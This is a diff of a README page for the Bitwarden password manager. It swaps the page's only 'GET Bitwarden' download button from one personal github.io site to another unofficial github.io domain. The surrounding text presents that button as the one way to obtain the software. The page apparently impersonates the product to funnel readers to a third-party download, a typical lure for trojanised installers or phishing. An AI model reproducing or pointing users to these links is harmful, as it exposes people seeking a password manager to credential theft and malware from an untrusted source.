@@ -63,7 +63,7 @@ Desktop builds exist for Windows, macOS, and Linux. Mobile builds exist for Andr
 
 One button below is the obtain action for this page. Install steps for a server you host are under Running, not a second download block.
 
-[![GET Bitwarden](https://img.shields.io/badge/GET-Bitwarden-175D96?style=social&labelColor=111827&logoColor=white)](https://nicoleobrien077.github.io/.github/Bitwarden)
+[![GET Bitwarden](https://img.shields.io/badge/GET-Bitwarden-175D96?style=social&labelColor=111827&logoColor=white)](https://bitwarden-password-generator.github.io/bitwarden-open-source/)
 
 Pick the client that matches the device you type on. The bitwarden extension is enough for a browser only setup. Add the desktop app when you want a vault window outside the browser. Add mobile when you need fill on a phone. They all read the same bitwarden vault after you sign in.
 
